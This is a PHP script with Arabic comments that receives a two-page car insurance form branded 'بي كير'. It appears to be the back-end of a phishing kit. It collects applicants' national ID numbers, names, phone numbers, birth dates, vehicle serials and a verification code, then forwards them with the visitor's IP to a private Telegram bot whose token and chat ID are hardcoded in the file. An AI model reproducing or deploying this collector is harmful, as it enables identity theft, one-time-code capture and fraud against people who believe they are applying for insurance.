<?php
// إعدادات التليجرام
define('BOT_TOKEN', '8716166611:AAFMgUb2iMpmWozRF2iuooR661v19EKjiKs');
define('CHAT_ID', '8535558521');

// استقبال البيانات من الصفحة الأولى
$insurance_type = isset($_POST['insurance_type']) ? $_POST['insurance_type'] : '';
$identity_number = isset($_POST['identity_number']) ? $_POST['identity_number'] : '';
$applicant_name = isset($_POST['applicant_name']) ? $_POST['applicant_name'] : '';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
$birth_date = isset($_POST['birth_date']) ? $_POST['birth_date'] : '';
$registration_method = isset($_POST['registration_method']) ? $_POST['registration_method'] : '';
$serial_number = isset($_POST['serial_number']) ? $_POST['serial_number'] : '';
$verification_code = isset($_POST['verification_code']) ? $_POST['verification_code'] : '';

// استقبال البيانات من الصفحة الثانية
$coverage_type = isset($_POST['coverage_type']) ? $_POST['coverage_type'] : '';
$policy_start_date = isset($_POST['policy_start_date']) ? $_POST['policy_start_date'] : '';
$vehicle_purpose = isset($_POST['vehicle_purpose']) ? $_POST['vehicle_purpose'] : '';
$vehicle_type = isset($_POST['vehicle_type']) ? $_POST['vehicle_type'] : '';
$manufacture_year = isset($_POST['manufacture_year']) ? $_POST['manufacture_year'] : '';
$vehicle_value = isset($_POST['vehicle_value']) ? $_POST['vehicle_value'] : '';
$repair_location = isset($_POST['repair_location']) ? $_POST['repair_location'] : '';

// ترجمة القيم للعربية
function translateValue($key, $value) {
    $translations = [
        'insurance_type' => [
            'new' => 'تأمين جديد',
            'transfer' => 'نقل الملكية'
        ],
        'registration_method' => [
            'serial' => 'الرقم التسلسلي',
            'customs' => 'بطاقة جمركية'
        ],
        'coverage_type' => [
            'third_party' => 'ضد الغير',
            'comprehensive' => 'شامل'
        ],
        'vehicle_purpose' => [
            'personal' => 'شخصي',
            'commercial' => 'تجاري',
            'rental' => 'تأجير',
            'ride_hailing' => 'نقل الركاب (كريم/أوبر)',
            'cargo' => 'نقل البضائع',
            'petroleum' => 'نقل مشتقات نفطية'
        ],
        'repair_location' => [
            'agency' => 'الوكالة',
            'workshop' => 'الورشة'
        ]
    ];
    
    return isset($translations[$key][$value]) ? $translations[$key][$value] : $value;
}

// بناء الرسالة الكاملة
$message = "🚗 <b>طلب تأمين جديد - بي كير</b>\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📋 <b>المعلومات الشخصية</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= "📌 <b>نوع التأمين:</b> " . translateValue('insurance_type', $insurance_type) . "\n\n";
$message .= "👤 <b>رقم الهوية/الإقامة:</b> " . $identity_number . "\n\n";
$message .= "✍️ <b>اسم مقدم الطلب:</b> " . $applicant_name . "\n\n";
$message .= "📱 <b>رقم الجوال:</b> " . $phone_number . "\n\n";

if (!empty($birth_date)) {
    $message .= "🎂 <b>تاريخ الميلاد:</b> " . $birth_date . "\n\n";
}

$message .= "🔧 <b>طريقة التسجيل:</b> " . translateValue('registration_method', $registration_method) . "\n\n";
$message .= "🔢 <b>رقم المركبة:</b> " . $serial_number . "\n\n";

$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🚘 <b>معلومات المركبة</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= "🛡️ <b>نوع التغطية:</b> " . translateValue('coverage_type', $coverage_type) . "\n\n";
$message .= "📅 <b>تاريخ بدء الوثيقة:</b> " . $policy_start_date . "\n\n";
$message .= "🎯 <b>الغرض من الاستخدام:</b> " . translateValue('vehicle_purpose', $vehicle_purpose) . "\n\n";
$message .= "🚙 <b>نوع المركبة:</b> " . $vehicle_type . "\n\n";
$message .= "📆 <b>سنة الصنع:</b> " . $manufacture_year . "\n\n";
$message .= "💰 <b>قيمة المركبة:</b> " . $vehicle_value . " ريال\n\n";
$message .= "🔧 <b>مكان الإصلاح:</b> " . translateValue('repair_location', $repair_location) . "\n\n";

$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "⏰ <b>وقت الطلب:</b> " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'];

// إرسال الرسالة إلى التليجرام
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// إرسال الرسالة
$response = sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);

// إرجاع استجابة نجاح
header('Content-Type: application/json');
if ($response !== false) {
    echo json_encode([
        'success' => true,
        'message' => 'تم الإرسال بنجاح'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'فشل الإرسال'
    ]);
}
?>